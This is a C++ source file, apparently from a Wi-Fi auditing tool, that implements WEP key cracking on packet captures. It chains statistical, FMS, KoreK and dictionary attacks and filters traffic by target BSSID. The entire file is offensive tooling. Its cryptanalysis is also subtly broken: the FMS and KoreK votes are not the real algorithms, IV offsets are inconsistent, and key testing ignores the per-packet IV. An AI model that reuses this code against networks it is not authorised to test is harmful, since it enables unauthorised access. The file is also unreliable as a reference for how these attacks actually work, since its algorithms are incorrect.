#include "airlevi-crack/wep_crack.h"
#include "common/logger.h"
#include "common/packet_parser.h"
#include <fstream>
#include <algorithm>
#include <map>
#include <cmath>

namespace airlevi {

WEPCrack::WEPCrack(const Config& config) : config_(config) {}

WEPCrack::~WEPCrack() {}

bool WEPCrack::crack(std::string& found_key) {
    Logger::getInstance().info("Starting WEP crack attack");
    
    if (!loadCaptureFile()) {
        Logger::getInstance().error("Failed to load capture file");
        return false;
    }
    
    if (!extractWEPData()) {
        Logger::getInstance().error("No WEP data found in capture file");
        return false;
    }
    
    Logger::getInstance().info("Found " + std::to_string(captured_packets_.size()) + " WEP packets");
    
    // Try statistical attack first (fastest)
    if (statisticalAttack(found_key)) {
        return true;
    }
    
    // Try FMS attack
    if (fmsAttack(found_key)) {
        return true;
    }
    
    // Try KoreK attack
    if (koreKAttack(found_key)) {
        return true;
    }
    
    // Try dictionary attack as last resort
    if (!config_.wordlist_file.empty()) {
        return dictionaryAttack(found_key);
    }
    
    return false;
}

bool WEPCrack::statisticalAttack(std::string& found_key) {
    Logger::getInstance().info("Attempting statistical attack");
    
    if (captured_packets_.size() < 10000) {
        Logger::getInstance().warning("Not enough packets for reliable statistical attack (need ~10000+)");
    }
    
    // Try different key lengths
    for (int key_len : {5, 13, 16, 29}) { // 40, 104, 128, 232 bit keys
        Logger::getInstance().info("Trying " + std::to_string(key_len * 8) + "-bit key");
        
        auto key = recoverKey(key_len);
        if (!key.empty() && testKey(key)) {
            found_key = CryptoUtils::bytesToHex(key);
            Logger::getInstance().info("Key found: " + found_key);
            return true;
        }
    }
    
    return false;
}

bool WEPCrack::fmsAttack(std::string& found_key) {
    Logger::getInstance().info("Attempting FMS attack");
    
    collectWeakIVs();
    
    if (weak_ivs_.size() < 100) {
        Logger::getInstance().warning("Not enough weak IVs for FMS attack");
        return false;
    }
    
    Logger::getInstance().info("Found " + std::to_string(weak_ivs_.size()) + " weak IVs");
    
    // FMS attack implementation
    for (int key_len : {5, 13}) {
        std::vector<uint8_t> key(key_len);
        std::vector<std::map<uint8_t, int>> key_votes(key_len);
        
        for (const auto& iv : weak_ivs_) {
            if (iv.size() < 3) continue;
            
            // FMS weak IV analysis
            for (int pos = 0; pos < key_len && pos < 3; ++pos) {
                uint8_t candidate = iv[pos] ^ (pos + 1);
                key_votes[pos][candidate]++;
            }
        }
        
        // Select most voted bytes
        bool valid_key = true;
        for (int i = 0; i < key_len; ++i) {
            if (key_votes[i].empty()) {
                valid_key = false;
                break;
            }
            
            auto max_vote = std::max_element(key_votes[i].begin(), key_votes[i].end(),
                [](const auto& a, const auto& b) { return a.second < b.second; });
            
            key[i] = max_vote->first;
        }
        
        if (valid_key && testKey(key)) {
            found_key = CryptoUtils::bytesToHex(key);
            Logger::getInstance().info("FMS key found: " + found_key);
            return true;
        }
    }
    
    return false;
}

bool WEPCrack::koreKAttack(std::string& found_key) {
    Logger::getInstance().info("Attempting KoreK attack");
    
    // KoreK attack uses multiple statistical tests
    for (int key_len : {5, 13}) {
        std::vector<uint8_t> key(key_len);
        std::vector<std::vector<int>> votes(key_len, std::vector<int>(256, 0));
        
        for (const auto& packet : captured_packets_) {
            if (packet.size() < 8) continue; // Need IV + at least some data
            
            std::vector<uint8_t> iv(packet.begin(), packet.begin() + 3);
            
            // Apply KoreK statistical tests
            for (int pos = 0; pos < key_len; ++pos) {
                // Test A_neg (negative correlation)
                if (iv[0] == pos + 3) {
                    uint8_t candidate = packet[3 + pos] ^ iv[0];
                    votes[pos][candidate] += 2;
                }
                
                // Test A_pos (positive correlation)
                if (iv[0] == pos + 1) {
                    uint8_t candidate = packet[3 + pos] ^ (iv[0] + iv[1]);
                    votes[pos][candidate] += 1;
                }
                
                // Additional KoreK tests can be added here
            }
        }
        
        // Select highest voted bytes
        for (int i = 0; i < key_len; ++i) {
            auto max_it = std::max_element(votes[i].begin(), votes[i].end());
            key[i] = std::distance(votes[i].begin(), max_it);
        }
        
        if (testKey(key)) {
            found_key = CryptoUtils::bytesToHex(key);
            Logger::getInstance().info("KoreK key found: " + found_key);
            return true;
        }
    }
    
    return false;
}

bool WEPCrack::dictionaryAttack(std::string& found_key) {
    Logger::getInstance().info("Attempting dictionary attack");
    
    std::ifstream wordlist(config_.wordlist_file);
    if (!wordlist.is_open()) {
        Logger::getInstance().error("Cannot open wordlist file: " + config_.wordlist_file);
        return false;
    }
    
    std::string password;
    int attempts = 0;
    
    while (std::getline(wordlist, password) && attempts < 1000000) {
        attempts++;
        
        if (attempts % 10000 == 0) {
            Logger::getInstance().info("Tried " + std::to_string(attempts) + " passwords");
        }
        
        // Generate WEP key from password
        auto key = CryptoUtils::generateWEPKeyFromPassphrase(password, 5);
        if (testKey(key)) {
            found_key = password + " (" + CryptoUtils::bytesToHex(key) + ")";
            Logger::getInstance().info("Dictionary key found: " + found_key);
            return true;
        }
        
        // Try 13-byte key
        key = CryptoUtils::generateWEPKeyFromPassphrase(password, 13);
        if (testKey(key)) {
            found_key = password + " (" + CryptoUtils::bytesToHex(key) + ")";
            Logger::getInstance().info("Dictionary key found: " + found_key);
            return true;
        }
    }
    
    Logger::getInstance().info("Dictionary attack completed. Tried " + std::to_string(attempts) + " passwords");
    return false;
}

bool WEPCrack::loadCaptureFile() {
    std::ifstream file(config_.output_file, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    // Skip pcap header (24 bytes)
    file.seekg(24);
    
    PacketParser parser;
    
    while (file.good()) {
        // Read packet header
        struct {
            uint32_t ts_sec;
            uint32_t ts_usec;
            uint32_t caplen;
            uint32_t len;
        } pkt_hdr;
        
        file.read(reinterpret_cast<char*>(&pkt_hdr), sizeof(pkt_hdr));
        if (file.gcount() != sizeof(pkt_hdr)) break;
        
        // Read packet data
        std::vector<uint8_t> packet(pkt_hdr.caplen);
        file.read(reinterpret_cast<char*>(packet.data()), pkt_hdr.caplen);
        if (file.gcount() != pkt_hdr.caplen) break;
        
        // Check if it's a WEP encrypted data frame
        if (packet.size() > 24 && parser.isDataFrame(packet.data())) {
            // Check for WEP encryption (privacy bit set)
            if ((packet[1] & 0x40) != 0) {
                captured_packets_.push_back(packet);
            }
        }
    }
    
    return !captured_packets_.empty();
}

bool WEPCrack::extractWEPData() {
    if (captured_packets_.empty()) return false;
    
    // Filter packets by target BSSID if specified
    if (!config_.target_bssid.empty()) {
        auto it = std::remove_if(captured_packets_.begin(), captured_packets_.end(),
            [this](const std::vector<uint8_t>& packet) {
                if (packet.size() < 24) return true;
                
                // Extract BSSID from packet and compare
                MacAddress bssid(packet.data() + 16); // addr3 in data frames
                return bssid.toString() != config_.target_bssid;
            });
        
        captured_packets_.erase(it, captured_packets_.end());
    }
    
    return !captured_packets_.empty();
}

std::vector<uint8_t> WEPCrack::recoverKey(int key_length) {
    std::vector<uint8_t> key(key_length);
    std::vector<std::vector<int>> votes(key_length, std::vector<int>(256, 0));
    
    // Statistical analysis of all packets
    for (const auto& packet : captured_packets_) {
        if (packet.size() < 28) continue; // Need full header + IV + some data
        
        // Extract IV (3 bytes after 802.11 header)
        std::vector<uint8_t> iv(packet.begin() + 24, packet.begin() + 27);
        
        // Analyze each key byte position
        for (int pos = 0; pos < key_length && pos < 16; ++pos) {
            if (packet.size() <= 28 + pos) break;
            
            // Simple statistical correlation
            uint8_t encrypted_byte = packet[28 + pos];
            
            for (int candidate = 0; candidate < 256; ++candidate) {
                // Test if this candidate produces expected patterns
                uint8_t test_byte = encrypted_byte ^ candidate ^ iv[pos % 3];
                
                // Look for common plaintext patterns
                if (test_byte == 0xAA || test_byte == 0x03 || test_byte == 0x00) {
                    votes[pos][candidate] += 2;
                } else if (test_byte < 0x20 || test_byte > 0x7E) {
                    votes[pos][candidate] -= 1;
                } else {
                    votes[pos][candidate] += 1;
                }
            }
        }
    }
    
    // Select most voted candidates
    for (int i = 0; i < key_length; ++i) {
        auto max_it = std::max_element(votes[i].begin(), votes[i].end());
        key[i] = std::distance(votes[i].begin(), max_it);
    }
    
    return key;
}

bool WEPCrack::testKey(const std::vector<uint8_t>& key) {
    if (captured_packets_.empty()) return false;
    
    int successful_decrypts = 0;
    int total_tests = std::min(10, static_cast<int>(captured_packets_.size()));
    
    for (int i = 0; i < total_tests; ++i) {
        const auto& packet = captured_packets_[i];
        if (packet.size() < 32) continue;
        
        // Extract encrypted data (skip header + IV + key index)
        std::vector<uint8_t> encrypted_data(packet.begin() + 28, packet.end() - 4); // Remove ICV
        
        auto decrypted = CryptoUtils::wepDecrypt(encrypted_data, key);
        
        if (!decrypted.empty() && decrypted.size() >= 8) {
            // Check for valid LLC/SNAP header
            if (decrypted[0] == 0xAA && decrypted[1] == 0xAA && decrypted[2] == 0x03) {
                successful_decrypts++;
            }
        }
    }
    
    // Consider key valid if it successfully decrypts at least 70% of test packets
    double success_rate = static_cast<double>(successful_decrypts) / total_tests;
    return success_rate >= 0.7;
}

void WEPCrack::collectWeakIVs() {
    weak_ivs_.clear();
    
    for (const auto& packet : captured_packets_) {
        if (packet.size() < 27) continue;
        
        std::vector<uint8_t> iv(packet.begin() + 24, packet.begin() + 27);
        
        if (isWeakIV(iv)) {
            weak_ivs_.push_back(iv);
        }
    }
}

bool WEPCrack::isWeakIV(const std::vector<uint8_t>& iv) {
    if (iv.size() != 3) return false;
    
    // FMS weak IVs: (A+3, N-1, X) where A is key byte position
    for (int a = 0; a < 16; ++a) {
        if (iv[0] == (a + 3) && iv[1] == 255) {
            return true;
        }
    }
    
    // Additional weak IV patterns
    if (iv[0] < 16 && iv[1] == 255) return true;
    if (iv[0] == 255 && iv[1] < 16) return true;
    
    return false;
}

} // namespace airlevi
